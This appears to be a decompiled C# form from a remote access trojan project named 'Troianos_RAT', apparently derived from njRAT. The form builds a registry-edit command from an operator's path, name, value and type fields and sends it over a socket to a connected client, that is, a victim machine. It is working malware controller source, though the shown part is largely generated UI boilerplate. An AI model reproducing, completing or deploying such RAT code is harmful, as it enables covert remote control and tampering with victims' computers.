using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x0200001C RID: 28
	[DesignerGenerated]
	public partial class RGv : Form
	{
		// Token: 0x0600031B RID: 795 RVA: 0x001F5730 File Offset: 0x001F3B30
		[DebuggerNonUserCode]
		public RGv()
		{
			base.Load += this.RGv_Load;
			RGv.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x0600031C RID: 796 RVA: 0x001F575C File Offset: 0x001F3B5C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = RGv.__ENCList;
			lock (_ENCList)
			{
				bool flag = RGv.__ENCList.Count == RGv.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = RGv.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = RGv.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								RGv.__ENCList[num] = RGv.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					RGv.__ENCList.RemoveRange(num, RGv.__ENCList.Count - num);
					RGv.__ENCList.Capacity = RGv.__ENCList.Count;
				}
				RGv.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000104 RID: 260
		// (get) Token: 0x0600031F RID: 799 RVA: 0x001F5F4C File Offset: 0x001F434C
		// (set) Token: 0x06000320 RID: 800 RVA: 0x001F5F64 File Offset: 0x001F4364
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x17000105 RID: 261
		// (get) Token: 0x06000321 RID: 801 RVA: 0x001F5F70 File Offset: 0x001F4370
		// (set) Token: 0x06000322 RID: 802 RVA: 0x001F5F88 File Offset: 0x001F4388
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x17000106 RID: 262
		// (get) Token: 0x06000323 RID: 803 RVA: 0x001F5F94 File Offset: 0x001F4394
		// (set) Token: 0x06000324 RID: 804 RVA: 0x001F5FAC File Offset: 0x001F43AC
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x17000107 RID: 263
		// (get) Token: 0x06000325 RID: 805 RVA: 0x001F5FB8 File Offset: 0x001F43B8
		// (set) Token: 0x06000326 RID: 806 RVA: 0x001F5FD0 File Offset: 0x001F43D0
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x17000108 RID: 264
		// (get) Token: 0x06000327 RID: 807 RVA: 0x001F5FDC File Offset: 0x001F43DC
		// (set) Token: 0x06000328 RID: 808 RVA: 0x001F5FF4 File Offset: 0x001F43F4
		internal virtual TextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		// Token: 0x17000109 RID: 265
		// (get) Token: 0x06000329 RID: 809 RVA: 0x001F6000 File Offset: 0x001F4400
		// (set) Token: 0x0600032A RID: 810 RVA: 0x001F6018 File Offset: 0x001F4418
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700010A RID: 266
		// (get) Token: 0x0600032B RID: 811 RVA: 0x001F6078 File Offset: 0x001F4478
		// (set) Token: 0x0600032C RID: 812 RVA: 0x001F6090 File Offset: 0x001F4490
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x0600032D RID: 813 RVA: 0x001F609C File Offset: 0x001F449C
		private void Button1_Click(object sender, EventArgs e)
		{
			this.sk.Send(string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"RG",
				Class7.string_1,
				"!",
				Class7.string_1,
				this.Path,
				Class7.string_1,
				this.TextBox1.Text,
				Class7.string_1,
				this.TextBox3.Text,
				Class7.string_1,
				Conversions.ToString(this.Typ(this.ComboBox1.Text))
			}));
			this.Close();
		}

		// Token: 0x0600032E RID: 814 RVA: 0x001F6164 File Offset: 0x001F4564
		public int Typ(string t)
		{
			string left = t.ToLower();
			bool flag = Operators.CompareString(left, RegistryValueKind.Binary.ToString().ToLower(), false) == 0;
			int result;
			if (flag)
			{
				result = 3;
			}
			else
			{
				flag = (Operators.CompareString(left, RegistryValueKind.DWord.ToString().ToLower(), false) == 0);
				if (flag)
				{
					result = 4;
				}
				else
				{
					flag = (Operators.CompareString(left, RegistryValueKind.ExpandString.ToString().ToLower(), false) == 0);
					if (flag)
					{
						result = 2;
					}
					else
					{
						flag = (Operators.CompareString(left, RegistryValueKind.MultiString.ToString().ToLower(), false) == 0);
						if (flag)
						{
							result = 7;
						}
						else
						{
							flag = (Operators.CompareString(left, RegistryValueKind.QWord.ToString().ToLower(), false) == 0);
							if (flag)
							{
								result = 11;
							}
							else
							{
								flag = (Operators.CompareString(left, RegistryValueKind.String.ToString().ToLower(), false) == 0);
								if (flag)
								{
									result = 1;
								}
								else
								{
									int num;
									result = num;
								}
							}
						}
					}
				}
			}
			return result;
		}

		// Token: 0x0600032F RID: 815 RVA: 0x001F6258 File Offset: 0x001F4658
		private void RGv_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0400017A RID: 378
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400017C RID: 380
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x0400017D RID: 381
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x0400017E RID: 382
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x0400017F RID: 383
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000180 RID: 384
		[AccessedThroughProperty("TextBox3")]
		private TextBox _TextBox3;

		// Token: 0x04000181 RID: 385
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000182 RID: 386
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000183 RID: 387
		public string Path;

		// Token: 0x04000184 RID: 388
		public Client sk;
	}
}
